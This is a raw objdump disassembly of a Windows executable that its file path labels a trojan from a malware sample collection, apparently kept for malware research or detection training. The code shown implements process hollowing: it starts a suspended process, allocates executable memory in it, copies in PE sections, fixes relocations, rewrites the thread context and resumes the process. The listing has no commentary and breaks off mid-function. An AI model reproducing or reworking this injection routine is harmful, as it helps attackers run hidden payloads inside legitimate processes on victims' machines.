
malware_samples/trojan/45d920001496e846e5f28c755ef5d67f6a0b0f18a5690e6d6fb47a71f65b787e.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	40 55                	rex push %rbp
   140001002:	53                   	push   %rbx
   140001003:	56                   	push   %rsi
   140001004:	57                   	push   %rdi
   140001005:	41 55                	push   %r13
   140001007:	41 57                	push   %r15
   140001009:	48 8d ac 24 28 fc ff 	lea    -0x3d8(%rsp),%rbp
   140001010:	ff 
   140001011:	48 81 ec d8 04 00 00 	sub    $0x4d8,%rsp
   140001018:	48 63 71 3c          	movslq 0x3c(%rcx),%rsi
   14000101c:	0f 57 c9             	xorps  %xmm1,%xmm1
   14000101f:	48 03 f1             	add    %rcx,%rsi
   140001022:	4c 8b e9             	mov    %rcx,%r13
   140001025:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001028:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   14000102c:	ba 04 01 00 00       	mov    $0x104,%edx
   140001031:	8b 46 28             	mov    0x28(%rsi),%eax
   140001034:	44 8b 7e 34          	mov    0x34(%rsi),%r15d
   140001038:	8b 5e 50             	mov    0x50(%rsi),%ebx
   14000103b:	8b 7e 54             	mov    0x54(%rsi),%edi
   14000103e:	89 85 18 04 00 00    	mov    %eax,0x418(%rbp)
   140001044:	33 c0                	xor    %eax,%eax
   140001046:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   14000104b:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   14000104e:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140001053:	c7 44 24 70 68 00 00 	movl   $0x68,0x70(%rsp)
   14000105a:	00 
   14000105b:	0f 11 4c 24 74       	movups %xmm1,0x74(%rsp)
   140001060:	0f 11 4d 84          	movups %xmm1,-0x7c(%rbp)
   140001064:	0f 11 4d 94          	movups %xmm1,-0x6c(%rbp)
   140001068:	0f 11 4d a4          	movups %xmm1,-0x5c(%rbp)
   14000106c:	0f 11 4d b4          	movups %xmm1,-0x4c(%rbp)
   140001070:	0f 11 4d c4          	movups %xmm1,-0x3c(%rbp)
   140001074:	ff 15 ee 1f 01 00    	call   *0x11fee(%rip)        # 0x140013068
   14000107a:	85 c0                	test   %eax,%eax
   14000107c:	75 13                	jne    0x140001091
   14000107e:	ba 04 01 00 00       	mov    $0x104,%edx
   140001083:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140001087:	ff 15 ab 1f 01 00    	call   *0x11fab(%rip)        # 0x140013038
   14000108d:	85 c0                	test   %eax,%eax
   14000108f:	74 38                	je     0x1400010c9
   140001091:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140001095:	48 ff c9             	dec    %rcx
   140001098:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000109f:	00 
   1400010a0:	80 79 01 00          	cmpb   $0x0,0x1(%rcx)
   1400010a4:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   1400010a8:	75 f6                	jne    0x1400010a0
   1400010aa:	8b 05 e8 24 01 00    	mov    0x124e8(%rip),%eax        # 0x140013598
   1400010b0:	f2 0f 10 05 d8 24 01 	movsd  0x124d8(%rip),%xmm0        # 0x140013590
   1400010b7:	00 
   1400010b8:	f2 0f 11 01          	movsd  %xmm0,(%rcx)
   1400010bc:	89 41 08             	mov    %eax,0x8(%rcx)
   1400010bf:	0f b6 05 d6 24 01 00 	movzbl 0x124d6(%rip),%eax        # 0x14001359c
   1400010c6:	88 41 0c             	mov    %al,0xc(%rcx)
   1400010c9:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1400010ce:	45 33 c9             	xor    %r9d,%r9d
   1400010d1:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400010d6:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400010da:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   1400010df:	45 33 c0             	xor    %r8d,%r8d
   1400010e2:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400010e7:	33 d2                	xor    %edx,%edx
   1400010e9:	33 c0                	xor    %eax,%eax
   1400010eb:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400010f0:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400010f5:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   1400010fc:	00 
   1400010fd:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140001101:	ff 15 b9 d9 01 00    	call   *0x1d9b9(%rip)        # 0x14001eac0
   140001107:	85 c0                	test   %eax,%eax
   140001109:	74 44                	je     0x14000114f
   14000110b:	33 d2                	xor    %edx,%edx
   14000110d:	48 8d 8d f4 00 00 00 	lea    0xf4(%rbp),%rcx
   140001114:	41 b8 c8 02 00 00    	mov    $0x2c8,%r8d
   14000111a:	e8 11 07 01 00       	call   0x140011830
   14000111f:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140001124:	48 8d 95 f0 00 00 00 	lea    0xf0(%rbp),%rdx
   14000112b:	c7 85 f0 00 00 00 07 	movl   $0x10007,0xf0(%rbp)
   140001132:	00 01 00 
   140001135:	ff 15 35 1f 01 00    	call   *0x11f35(%rip)        # 0x140013070
   14000113b:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001140:	85 c0                	test   %eax,%eax
   140001142:	75 20                	jne    0x140001164
   140001144:	ba 01 00 00 00       	mov    $0x1,%edx
   140001149:	ff 15 d9 1e 01 00    	call   *0x11ed9(%rip)        # 0x140013028
   14000114f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140001154:	48 81 c4 d8 04 00 00 	add    $0x4d8,%rsp
   14000115b:	41 5f                	pop    %r15
   14000115d:	41 5d                	pop    %r13
   14000115f:	5f                   	pop    %rdi
   140001160:	5e                   	pop    %rsi
   140001161:	5b                   	pop    %rbx
   140001162:	5d                   	pop    %rbp
   140001163:	c3                   	ret
   140001164:	4c 89 a4 24 d0 04 00 	mov    %r12,0x4d0(%rsp)
   14000116b:	00 
   14000116c:	49 8b d7             	mov    %r15,%rdx
   14000116f:	4c 89 b4 24 c8 04 00 	mov    %r14,0x4c8(%rsp)
   140001176:	00 
   140001177:	4c 8b c3             	mov    %rbx,%r8
   14000117a:	41 be 00 30 00 00    	mov    $0x3000,%r14d
   140001180:	48 89 9d 28 04 00 00 	mov    %rbx,0x428(%rbp)
   140001187:	45 8b ce             	mov    %r14d,%r9d
   14000118a:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   140001191:	00 
   140001192:	ff 15 58 d9 01 00    	call   *0x1d958(%rip)        # 0x14001eaf0
   140001198:	4c 8b e0             	mov    %rax,%r12
   14000119b:	48 85 c0             	test   %rax,%rax
   14000119e:	75 27                	jne    0x1400011c7
   1400011a0:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1400011a5:	45 8b ce             	mov    %r14d,%r9d
   1400011a8:	4c 8b c3             	mov    %rbx,%r8
   1400011ab:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   1400011b2:	00 
   1400011b3:	33 d2                	xor    %edx,%edx
   1400011b5:	ff 15 35 d9 01 00    	call   *0x1d935(%rip)        # 0x14001eaf0
   1400011bb:	4c 8b e0             	mov    %rax,%r12
   1400011be:	48 85 c0             	test   %rax,%rax
   1400011c1:	0f 84 63 01 00 00    	je     0x14000132a
   1400011c7:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   1400011cd:	44 89 a5 10 04 00 00 	mov    %r12d,0x410(%rbp)
   1400011d4:	45 8b c6             	mov    %r14d,%r8d
   1400011d7:	48 8b d3             	mov    %rbx,%rdx
   1400011da:	33 c9                	xor    %ecx,%ecx
   1400011dc:	ff 15 5e 1e 01 00    	call   *0x11e5e(%rip)        # 0x140013040
   1400011e2:	4c 8b f0             	mov    %rax,%r14
   1400011e5:	48 85 c0             	test   %rax,%rax
   1400011e8:	0f 84 3c 01 00 00    	je     0x14000132a
   1400011ee:	4c 8b c7             	mov    %rdi,%r8
   1400011f1:	49 8b d5             	mov    %r13,%rdx
   1400011f4:	48 8b c8             	mov    %rax,%rcx
   1400011f7:	e8 94 ff 00 00       	call   0x140011190
   1400011fc:	0f b7 7e 14          	movzwl 0x14(%rsi),%edi
   140001200:	33 d2                	xor    %edx,%edx
   140001202:	48 03 fe             	add    %rsi,%rdi
   140001205:	0f b7 da             	movzwl %dx,%ebx
   140001208:	66 3b 56 06          	cmp    0x6(%rsi),%dx
   14000120c:	73 32                	jae    0x140001240
   14000120e:	66 90                	xchg   %ax,%ax
   140001210:	0f b7 c3             	movzwl %bx,%eax
   140001213:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140001217:	8b 44 cf 28          	mov    0x28(%rdi,%rcx,8),%eax
   14000121b:	85 c0                	test   %eax,%eax
   14000121d:	74 16                	je     0x140001235
   14000121f:	8b 54 cf 2c          	mov    0x2c(%rdi,%rcx,8),%edx
   140001223:	44 8b c0             	mov    %eax,%r8d
   140001226:	8b 4c cf 24          	mov    0x24(%rdi,%rcx,8),%ecx
   14000122a:	49 03 d5             	add    %r13,%rdx
   14000122d:	49 03 ce             	add    %r14,%rcx
   140001230:	e8 5b ff 00 00       	call   0x140011190
   140001235:	66 ff c3             	inc    %bx
   140001238:	66 3b 5e 06          	cmp    0x6(%rsi),%bx
   14000123c:	72 d2                	jb     0x140001210
   14000123e:	33 d2                	xor    %edx,%edx
   140001240:	8b 8d 10 04 00 00    	mov    0x410(%rbp),%ecx
   140001246:	41 3b cf             	cmp    %r15d,%ecx
   140001249:	0f 84 92 00 00 00    	je     0x1400012e1
   14000124f:	8b 86 a0 00 00 00    	mov    0xa0(%rsi),%eax
   140001255:	85 c0                	test   %eax,%eax
   140001257:	0f 84 84 00 00 00    	je     0x1400012e1
   14000125d:	8b be a4 00 00 00    	mov    0xa4(%rsi),%edi
   140001263:	85 ff                	test   %edi,%edi
   140001265:	0f 84 76 00 00 00    	je     0x1400012e1
   14000126b:	44 8b d9             	mov    %ecx,%r11d
   14000126e:	4d 8d 14 06          	lea    (%r14,%rax,1),%r10
   140001272:	45 2b df             	sub    %r15d,%r11d
   140001275:	8b da                	mov    %edx,%ebx
   140001277:	85 ff                	test   %edi,%edi
   140001279:	74 66                	je     0x1400012e1
   14000127b:	be 00 f0 00 00       	mov    $0xf000,%esi
   140001280:	41 bf 00 30 00 00    	mov    $0x3000,%r15d
   140001286:	41 8b 42 04          	mov    0x4(%r10),%eax
   14000128a:	85 c0                	test   %eax,%eax
   14000128c:	74 4b                	je     0x1400012d9
   14000128e:	48 83 e8 08          	sub    $0x8,%rax
   140001292:	49 8d 52 08          	lea    0x8(%r10),%rdx
   140001296:	48 d1 e8             	shr    $1,%rax
   140001299:	85 c0                	test   %eax,%eax
   14000129b:	74 2f                	je     0x1400012cc
   14000129d:	44 8b c8             	mov    %eax,%r9d
   1400012a0:	0f b7 02             	movzwl (%rdx),%eax
   1400012a3:	44 0f b7 c0          	movzwl %ax,%r8d
   1400012a7:	66 23 c6             	and    %si,%ax
   1400012aa:	66 41 3b c7          	cmp    %r15w,%ax
   1400012ae:	75 12                	jne    0x1400012c2
   1400012b0:	41 8b 0a             	mov    (%r10),%ecx
   1400012b3:	41 81 e0 ff 0f 00 00 	and    $0xfff,%r8d
   1400012ba:	4b 8d 04 06          	lea    (%r14,%r8,1),%rax
   1400012be:	44 01 1c 01          	add    %r11d,(%rcx,%rax,1)
   1400012c2:	48 83 c2 02          	add    $0x2,%rdx
   1400012c6:	49 83 e9 01          	sub    $0x1,%r9
   1400012ca:	75 d4                	jne    0x1400012a0
   1400012cc:	41 8b 42 04          	mov    0x4(%r10),%eax
   1400012d0:	03 d8                	add    %eax,%ebx
   1400012d2:	4c 03 d0             	add    %rax,%r10
   1400012d5:	3b df                	cmp    %edi,%ebx
   1400012d7:	72 ad                	jb     0x140001286
   1400012d9:	8b 8d 10 04 00 00    	mov    0x410(%rbp),%ecx
   1400012df:	33 d2                	xor    %edx,%edx
   1400012e1:	49 63 45 3c          	movslq 0x3c(%r13),%rax
   1400012e5:	4d 8b c6             	mov    %r14,%r8
   1400012e8:	4c 8b 8d 28 04 00 00 	mov    0x428(%rbp),%r9
   1400012ef:	42 89 4c 30 34       	mov    %ecx,0x34(%rax,%r14,1)
   1400012f4:	48 8d 85 20 04 00 00 	lea    0x420(%rbp),%rax
   1400012fb:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001300:	48 89 95 20 04 00 00 	mov    %rdx,0x420(%rbp)
   140001307:	49 8b d4             	mov    %r12,%rdx
   14000130a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000130f:	ff 15 d3 d7 01 00    	call   *0x1d7d3(%rip)        # 0x14001eae8
   140001315:	33 d2                	xor    %edx,%edx
   140001317:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
   14000131d:	49 8b ce             	mov    %r14,%rcx
   140001320:	85 c0                	test   %eax,%eax
   140001322:	75 20                	jne    0x140001344
   140001324:	ff 15 26 1d 01 00    	call   *0x11d26(%rip)        # 0x140013050
   14000132a:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   14000132f:	ba 01 00 00 00       	mov    $0x1,%edx
   140001334:	ff 15 ee 1c 01 00    	call   *0x11cee(%rip)        # 0x140013028
   14000133a:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000133f:	e9 8b 00 00 00       	jmp    0x1400013cf
   140001344:	ff 15 06 1d 01 00    	call   *0x11d06(%rip)        # 0x140013050
   14000134a:	8b 95 94 01 00 00    	mov    0x194(%rbp),%edx
   140001350:	48 8d 85 20 04 00 00 	lea    0x420(%rbp),%rax
   140001357:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   14000135c:	4c 8d 85 10 04 00 00 	lea    0x410(%rbp),%r8
   140001363:	83 c2 08             	add    $0x8,%edx
   140001366:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000136b:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140001371:	ff 15 71 d7 01 00    	call   *0x1d771(%rip)        # 0x14001eae8
   140001377:	85 c0                	test   %eax,%eax
   140001379:	74 af                	je     0x14000132a
   14000137b:	8b 8d 18 04 00 00    	mov    0x418(%rbp),%ecx
   140001381:	48 8d 95 f0 00 00 00 	lea    0xf0(%rbp),%rdx
   140001388:	03 8d 10 04 00 00    	add    0x410(%rbp),%ecx
   14000138e:	89 8d a0 01 00 00    	mov    %ecx,0x1a0(%rbp)
   140001394:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140001399:	ff 15 d9 1c 01 00    	call   *0x11cd9(%rip)        # 0x140013078
   14000139f:	85 c0                	test   %eax,%eax
   1400013a1:	74 87                	je     0x14000132a
   1400013a3:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   1400013a8:	ff 15 2a d7 01 00    	call   *0x1d72a(%rip)        # 0x14001ead8
   1400013ae:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400013b1:	0f 84 73 ff ff ff    	je     0x14000132a
   1400013b7:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   1400013bc:	ff 15 5e 1c 01 00    	call   *0x11c5e(%rip)        # 0x140013020
   1400013c2:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1400013c7:	ff 15 53 1c 01 00    	call   *0x11c53(%rip)        # 0x140013020
   1400013cd:	33 c0                	xor    %eax,%eax
   1400013cf:	4c 8b a4 24 d0 04 00 	mov    0x4d0(%rsp),%r12
   1400013d6:	00 
   1400013d7:	4c 8b b4 24 c8 04 00 	mov    0x4c8(%rsp),%r14
   1400013de:	00 
   1400013df:	48 81 c4 d8 04 00 00 	add    $0x4d8,%rsp
   1400013e6:	41 5f                	pop    %r15
   1400013e8:	41 5d                	pop    %r13
   1400013ea:	5f                   	pop    %rdi
   1400013eb:	5e                   	pop    %rsi
   1400013ec:	5b                   	pop    %rbx
   1400013ed:	5d                   	pop    %rbp
   1400013ee:	c3                   	ret
   1400013ef:	cc                   	int3
   1400013f0:	40 55                	rex push %rbp
   1400013f2:	53                   	push   %rbx
   1400013f3:	56                   	push   %rsi
   1400013f4:	57                   	push   %rdi
   1400013f5:	41 54                	push   %r12
   1400013f7:	41 57                	push   %r15
   1400013f9:	48 8d ac 24 28 fa ff 	lea    -0x5d8(%rsp),%rbp
   140001400:	ff 
   140001401:	48 81 ec d8 06 00 00 	sub    $0x6d8,%rsp
   140001408:	48 63 79 3c          	movslq 0x3c(%rcx),%rdi
   14000140c:	b8 0b 02 00 00       	mov    $0x20b,%eax
   140001411:	48 03 f9             	add    %rcx,%rdi
   140001414:	4c 8b f9             	mov    %rcx,%r15
   140001417:	66 39 47 18          	cmp    %ax,0x18(%rdi)
   14000141b:	0f 85 1e 01 00 00    	jne    0x14000153f
   140001421:	8b 5f 50             	mov    0x50(%rdi),%ebx
   140001424:	8b 47 28             	mov    0x28(%rdi),%eax
   140001427:	4c 8b 67 30          	mov    0x30(%rdi),%r12
   14000142b:	8b 77 54             	mov    0x54(%rdi),%esi
   14000142e:	89 85 10 06 00 00    	mov    %eax,0x610(%rbp)
   140001434:	85 db                	test   %ebx,%ebx
   140001436:	0f 84 03 01 00 00    	je     0x14000153f
   14000143c:	0f 57 c9             	xorps  %xmm1,%xmm1
   14000143f:	c7 44 24 70 68 00 00 	movl   $0x68,0x70(%rsp)
   140001446:	00 
   140001447:	33 c0                	xor    %eax,%eax
   140001449:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   14000144d:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001450:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140001455:	ba 04 01 00 00       	mov    $0x104,%edx
   14000145a:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   14000145d:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140001462:	0f 11 4c 24 74       	movups %xmm1,0x74(%rsp)
   140001467:	0f 11 4d 84          	movups %xmm1,-0x7c(%rbp)
   14000146b:	0f 11 4d 94          	movups %xmm1,-0x6c(%rbp)
   14000146f:	0f 11 4d a4          	movups %xmm1,-0x5c(%rbp)
   140001473:	0f 11 4d b4          	movups %xmm1,-0x4c(%rbp)
   140001477:	0f 11 4d c4          	movups %xmm1,-0x3c(%rbp)
   14000147b:	ff 15 b7 1b 01 00    	call   *0x11bb7(%rip)        # 0x140013038
   140001481:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140001485:	48 ff c9             	dec    %rcx
   140001488:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000148f:	00 
   140001490:	80 79 01 00          	cmpb   $0x0,0x1(%rcx)
   140001494:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   140001498:	75 f6                	jne    0x140001490
   14000149a:	8b 05 f8 20 01 00    	mov    0x120f8(%rip),%eax        # 0x140013598
   1400014a0:	45 33 c9             	xor    %r9d,%r9d
   1400014a3:	f2 0f 10 05 e5 20 01 	movsd  0x120e5(%rip),%xmm0        # 0x140013590
   1400014aa:	00 
   1400014ab:	45 33 c0             	xor    %r8d,%r8d
   1400014ae:	f2 0f 11 01          	movsd  %xmm0,(%rcx)
   1400014b2:	33 d2                	xor    %edx,%edx
   1400014b4:	89 41 08             	mov    %eax,0x8(%rcx)
   1400014b7:	0f b6 05 de 20 01 00 	movzbl 0x120de(%rip),%eax        # 0x14001359c
   1400014be:	88 41 0c             	mov    %al,0xc(%rcx)
   1400014c1:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1400014c6:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400014cb:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400014cf:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   1400014d4:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400014d9:	33 c0                	xor    %eax,%eax
   1400014db:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400014e0:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400014e5:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   1400014ec:	00 
   1400014ed:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1400014f1:	ff 15 c9 d5 01 00    	call   *0x1d5c9(%rip)        # 0x14001eac0
   1400014f7:	85 c0                	test   %eax,%eax
   1400014f9:	74 44                	je     0x14000153f
   1400014fb:	33 d2                	xor    %edx,%edx
   1400014fd:	48 8d 8d f0 00 00 00 	lea    0xf0(%rbp),%rcx
   140001504:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   14000150a:	e8 21 03 01 00       	call   0x140011830
   14000150f:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140001514:	48 8d 95 f0 00 00 00 	lea    0xf0(%rbp),%rdx
   14000151b:	c7 85 20 01 00 00 0b 	movl   $0x10000b,0x120(%rbp)
   140001522:	00 10 00 
   140001525:	ff 15 9d d5 01 00    	call   *0x1d59d(%rip)        # 0x14001eac8
   14000152b:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001530:	85 c0                	test   %eax,%eax
   140001532:	75 20                	jne    0x140001554
   140001534:	ba 01 00 00 00       	mov    $0x1,%edx
   140001539:	ff 15 e9 1a 01 00    	call   *0x11ae9(%rip)        # 0x140013028
   14000153f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140001544:	48 81 c4 d8 06 00 00 	add    $0x6d8,%rsp
   14000154b:	41 5f                	pop    %r15
   14000154d:	41 5c                	pop    %r12
   14000154f:	5f                   	pop    %rdi
   140001550:	5e                   	pop    %rsi
   140001551:	5b                   	pop    %rbx
   140001552:	5d                   	pop    %rbp
   140001553:	c3                   	ret
   140001554:	41 b9 00 30 00 00    	mov    $0x3000,%r9d
   14000155a:	4c 89 ac 24 d0 06 00 	mov    %r13,0x6d0(%rsp)
   140001561:	00 
   140001562:	4c 8b c3             	mov    %rbx,%r8
   140001565:	48 89 9d 28 06 00 00 	mov    %rbx,0x628(%rbp)
   14000156c:	49 8b d4             	mov    %r12,%rdx
   14000156f:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   140001576:	00 
   140001577:	ff 15 73 d5 01 00    	call   *0x1d573(%rip)        # 0x14001eaf0
   14000157d:	4c 8b e8             	mov    %rax,%r13
   140001580:	48 85 c0             	test   %rax,%rax
   140001583:	75 40                	jne    0x1400015c5
   140001585:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   14000158a:	41 b9 00 30 00 00    	mov    $0x3000,%r9d
   140001590:	4c 8b c3             	mov    %rbx,%r8
   140001593:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   14000159a:	00 
   14000159b:	33 d2                	xor    %edx,%edx
   14000159d:	ff 15 4d d5 01 00    	call   *0x1d54d(%rip)        # 0x14001eaf0
   1400015a3:	4c 8b e8             	mov    %rax,%r13
   1400015a6:	48 85 c0             	test   %rax,%rax
   1400015a9:	75 1a                	jne    0x1400015c5
   1400015ab:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1400015b0:	ba 01 00 00 00       	mov    $0x1,%edx
   1400015b5:	ff 15 6d 1a 01 00    	call   *0x11a6d(%rip)        # 0x140013028
   1400015bb:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400015c0:	e9 4e 02 00 00       	jmp    0x140001813
   1400015c5:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1400015ca:	49 8b d5             	mov    %r13,%rdx
   1400015cd:	4c 89 b4 24 c8 06 00 	mov    %r14,0x6c8(%rsp)
   1400015d4:	00 
   1400015d5:	e8 66 0a 00 00       	call   0x140002040
   1400015da:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   1400015e0:	4c 89 ad 18 06 00 00 	mov    %r13,0x618(%rbp)
   1400015e7:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   1400015ed:	48 8b d3             	mov    %rbx,%rdx
   1400015f0:	33 c9                	xor    %ecx,%ecx
   1400015f2:	ff 15 48 1a 01 00    	call   *0x11a48(%rip)        # 0x140013040
   1400015f8:	4c 8b f0             	mov    %rax,%r14
   1400015fb:	48 85 c0             	test   %rax,%rax
   1400015fe:	0f 84 5e 01 00 00    	je     0x140001762
   140001604:	4c 8b c6             	mov    %rsi,%r8
   140001607:	49 8b d7             	mov    %r15,%rdx
   14000160a:	48 8b c8             	mov    %rax,%rcx
   14000160d:	e8 7e fb 00 00       	call   0x140011190
   140001612:	0f b7 77 14          	movzwl 0x14(%rdi),%esi
   140001616:	33 c9                	xor    %ecx,%ecx
   140001618:	48 03 f7             	add    %rdi,%rsi
   14000161b:	0f b7 d9             	movzwl %cx,%ebx
   14000161e:	66 3b 4f 06          	cmp    0x6(%rdi),%cx
   140001622:	73 3c                	jae    0x140001660
   140001624:	0f 1f 40 00          	nopl   0x0(%rax)
   140001628:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000162f:	00 
   140001630:	0f b7 c3             	movzwl %bx,%eax
   140001633:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140001637:	8b 44 ce 28          	mov    0x28(%rsi,%rcx,8),%eax
   14000163b:	85 c0                	test   %eax,%eax
   14000163d:	74 16                	je     0x140001655
   14000163f:	8b 54 ce 2c          	mov    0x2c(%rsi,%rcx,8),%edx
   140001643:	44 8b c0             	mov    %eax,%r8d
   140001646:	8b 4c ce 24          	mov    0x24(%rsi,%rcx,8),%ecx
   14000164a:	49 03 d7             	add    %r15,%rdx
   14000164d:	49 03 ce             	add    %r14,%rcx
   140001650:	e8 3b fb 00 00       	call   0x140011190
   140001655:	66 ff c3             	inc    %bx
   140001658:	66 3b 5f 06          	cmp    0x6(%rdi),%bx
   14000165c:	72 d2                	jb     0x140001630
   14000165e:	33 c9                	xor    %ecx,%ecx
   140001660:	4c 8b 9d 18 06 00 00 	mov    0x618(%rbp),%r11
   140001667:	4d 3b dc             	cmp    %r12,%r11
   14000166a:	0f 84 a9 00 00 00    	je     0x140001719
   140001670:	49 63 47 3c          	movslq 0x3c(%r15),%rax
   140001674:	4a 8b 5c 30 30       	mov    0x30(%rax,%r14,1),%rbx
   140001679:	49 3b db             	cmp    %r11,%rbx
   14000167c:	0f 84 97 00 00 00    	je     0x140001719
   140001682:	42 8b b4 30 b4 00 00 	mov    0xb4(%rax,%r14,1),%esi
   140001689:	00 
   14000168a:	85 f6                	test   %esi,%esi
   14000168c:	0f 84 87 00 00 00    	je     0x140001719
   140001692:	46 8b 94 30 b0 00 00 	mov    0xb0(%rax,%r14,1),%r10d
   140001699:	00 
   14000169a:	8b f9                	mov    %ecx,%edi
   14000169c:	4d 03 d6             	add    %r14,%r10
   14000169f:	85 f6                	test   %esi,%esi
   1400016a1:	74 76                	je     0x140001719
   1400016a3:	41 bf 00 f0 00 00    	mov    $0xf000,%r15d
   1400016a9:	41 bc 00 a0 00 00    	mov    $0xa000,%r12d
   1400016af:	90                   	nop
   1400016b0:	41 8b 42 04          	mov    0x4(%r10),%eax
   1400016b4:	85 c0                	test   %eax,%eax
   1400016b6:	74 58                	je     0x140001710
   1400016b8:	48 83 e8 08          	sub    $0x8,%rax
   1400016bc:	4d 8d 42 08          	lea    0x8(%r10),%r8
   1400016c0:	48 d1 e8             	shr    $1,%rax
   1400016c3:	85 c0                	test   %eax,%eax
   1400016c5:	74 3c                	je     0x140001703
   1400016c7:	44 8b c8             	mov    %eax,%r9d
   1400016ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400016d0:	41 0f b7 00          	movzwl (%r8),%eax
   1400016d4:	0f b7 d0             	movzwl %ax,%edx
   1400016d7:	66 41 23 c7          	and    %r15w,%ax
   1400016db:	66 41 3b c4          	cmp    %r12w,%ax
   1400016df:	75 18                	jne    0x1400016f9
   1400016e1:	41 8b 0a             	mov    (%r10),%ecx
   1400016e4:	81 e2 ff 0f 00 00    	and    $0xfff,%edx
   1400016ea:	49 03 d6             	add    %r14,%rdx
   1400016ed:	49 8b c3             	mov    %r11,%rax
   1400016f0:	48 03 d1             	add    %rcx,%rdx
   1400016f3:	48 2b c3             	sub    %rbx,%rax
   1400016f6:	48 01 02             	add    %rax,(%rdx)
   1400016f9:	49 83 c0 02          	add    $0x2,%r8
   1400016fd:	49 83 e9 01          	sub    $0x1,%r9
   140001701:	75 cd                	jne    0x1400016d0
   140001703:	41 8b 42 04          	mov    0x4(%r10),%eax
   140001707:	03 f8                	add    %eax,%edi
   140001709:	4c 03 d0             	add    %rax,%r10
   14000170c:	3b fe                	cmp    %esi,%edi
   14000170e:	72 a0                	jb     0x1400016b0
   140001710:	4c 8b 9d 18 06 00 00 	mov    0x618(%rbp),%r11
   140001717:	33 c9                	xor    %ecx,%ecx
   140001719:	49 63 46 3c          	movslq 0x3c(%r14),%rax
   14000171d:	4d 8b c6             	mov    %r14,%r8
   140001720:	4c 8b 8d 28 06 00 00 	mov    0x628(%rbp),%r9
   140001727:	49 8b d5             	mov    %r13,%rdx
   14000172a:	4e 89 5c 30 30       	mov    %r11,0x30(%rax,%r14,1)
   14000172f:	48 8d 85 20 06 00 00 	lea    0x620(%rbp),%rax
   140001736:	48 89 8d 20 06 00 00 	mov    %rcx,0x620(%rbp)
   14000173d:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001742:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001747:	ff 15 9b d3 01 00    	call   *0x1d39b(%rip)        # 0x14001eae8
   14000174d:	33 d2                	xor    %edx,%edx
   14000174f:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
   140001755:	49 8b ce             	mov    %r14,%rcx
   140001758:	85 c0                	test   %eax,%eax
   14000175a:	75 20                	jne    0x14000177c
